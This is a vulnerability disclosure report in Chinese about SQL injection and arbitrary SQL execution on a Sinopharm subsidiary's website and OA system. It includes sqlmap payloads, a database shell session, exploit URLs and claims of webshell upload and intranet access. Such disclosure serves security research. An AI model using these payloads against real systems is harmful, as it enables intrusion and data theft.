wybug_title: 国药集团沿海某公司系统多个漏洞打包/getshell/影响多个系统
wybug_detail:
漏洞详情 披露状态：   									2015-12-25：	细节已通知厂商并且等待厂商处理中									2015-12-25：	厂商已经确认，细节仅向厂商公开									2016-01-04：	细节向核心白帽子及相关领域专家公开									2016-01-14：	细节向普通白帽子公开									2016-01-24：	细节向实习白帽子公开									2016-02-07：	细节向公众公开  简要描述： 看到有人上了首页，我也来一发打包的，上个首页可好？ 详细说明：  目标站点：国药山东有限公司http://58.56.60.68/主站存在SQL注入，注入点，搜索框：58.56.60.68/FindNews.aspx?KeyWord=山东
sqlmap resumed the following injection point(s) from stored session:---Parameter: KeyWord (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: KeyWord=山东%' AND 1878=1878 AND '%'='    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: KeyWord=山东%' AND 1148=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (1148=1148) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(122)+CHAR(113)+CHAR(113))) AND '%'='    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: KeyWord=山东%' OR 5207=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND '%'='---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005current database:    'db_gykg'current user is DBA:    True
任意SQL语句执行：
sql-shell> SELECT DB_NAME()[13:46:10] [INFO] fetching SQL SEL[13:46:10] [INFO] resumed: db_gykgSELECT DB_NAME():    'db_gykg'sql-shell> SELECT name FROM sysobj[13:46:28] [INFO] fetching SQL SEL[13:46:42] [INFO] the SQL query us[13:46:52] [INFO] retrieved: admin[13:47:04] [INFO] retrieved: admin[13:47:14] [INFO] retrieved: artic[13:47:25] [INFO] retrieved: bigcl[13:47:35] [INFO] retrieved: Custo[13:47:43] [INFO] retrieved: link[13:48:26] [CRITICAL] connection t[13:48:35] [INFO] retrieved: medic[13:48:49] [INFO] retrieved: Messa[13:49:06] [INFO] retrieved: partn[13:49:17] [INFO] retrieved: produ[13:49:30] [INFO] retrieved: qq[13:49:41] [INFO] retrieved: quest[13:49:52] [INFO] retrieved: recru[13:50:02] [INFO] retrieved: resum[13:50:12] [INFO] retrieved: site[13:50:20] [INFO] retrieved: small[13:50:30] [INFO] retrieved: Sys_C[13:50:39] [INFO] retrieved: sys_p[13:50:49] [INFO] retrieved: sys_s[13:51:00] [INFO] retrieved: userh[13:51:10] [INFO] retrieved: webpaSELECT name FROM sysobjects WHERE[*] admin[*] admintype[*] article[*] bigclass[*] Customer[*] link[*] medicine[*] Message[*] partner[*] products[*] qq[*] question[*] recruitment[*] resume[*] site[*] smallclass[*] Sys_City[*] sys_pic[*] sys_style[*] userhy[*] webpage
因为是DBA权限，所以可以getshell。网速太慢不演示了同服务器还有OA系统，有多个漏洞http://58.56.60.68:8088/yyoa/index.jsp首先是敏感信息泄露：



接着是任意SQL语句执行：http://58.56.60.68:8088/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20@@datadir

http://58.56.60.68:8088/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20database()



来getshell吧：

然后本地构建上传代码的表单，把webshell代码上传。

美美达照片：

看看域内主机，截图只显示部分，可影响内网多台主机：
